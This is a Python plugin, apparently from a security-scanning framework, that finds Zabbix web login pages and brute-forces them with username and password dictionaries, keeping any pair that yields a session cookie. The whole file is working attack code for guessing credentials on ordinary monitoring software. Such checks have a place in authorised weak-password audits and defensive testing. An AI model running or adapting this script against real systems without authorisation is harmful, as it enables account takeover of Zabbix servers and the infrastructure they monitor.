#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
from lib.core.data import paths
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ZABBIX
        self.name = 'zabbix burst'
        self.keyword = ['web', 'zabbix', 'burst']
        self.info = 'Burst zabbix weakpass.'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'zabbix_usernames.txt'))
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'zabbix_passwords.txt'))
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './zabbix/'),
                self.url_normpath(self.base_url, '/zabbix/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path + "index.php"
                    async with session.get(url=url) as res:
                        if res!=None:
                            text = await res.text()
                            if 'zabbix' in text:
                                async for (username, password) in self.generate_dict(usernamedic, passworddic):
                                    data = "name=" + username + "&password=" + password + "&autologin=1&enter=Sign+in"
                                    async with session.post(url=url, data=data, allow_redirects=False) as res:
                                        if res and res.status == 301 and 'Set-Cookie' in res.headers.keys() and 'zbx_sessionid' in \
                                                res.headers['Set-Cookie']:
                                            self.flag = 1
                                            self.req.append({"username": username, "password": password})
                                            self.res.append({"info": username + "/" + password,
                                                             "key": ":".join([username, password])})
